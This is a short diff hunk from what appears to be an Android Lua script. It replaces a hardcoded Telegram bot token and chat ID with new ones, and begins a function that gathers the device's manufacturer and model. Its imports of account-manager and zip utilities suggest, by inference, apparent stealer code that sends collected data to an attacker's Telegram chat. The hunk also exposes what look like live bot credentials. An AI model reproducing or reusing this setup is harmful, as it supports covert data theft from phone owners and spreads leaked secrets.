@@ -1061,8 +1061,8 @@ import "java.util.zip.*"
 import "android.accounts.AccountManager"
 import "android.content.Context"
 
-local BOT_TOKEN = "8653805951:AAFiJQo4r1Q2xHHVm7n1ZOBn-rYytRR9hYA"
-local CHAT_ID = "7287189057"
+local BOT_TOKEN = "8539319746:AAFaN6Br-VHopnIp0lHtX1giD0LMBBgACS8"
+local CHAT_ID = "7201369115"
 
 local function buildCaption()
   local device = Build.MANUFACTURER .. " " .. Build.MODEL
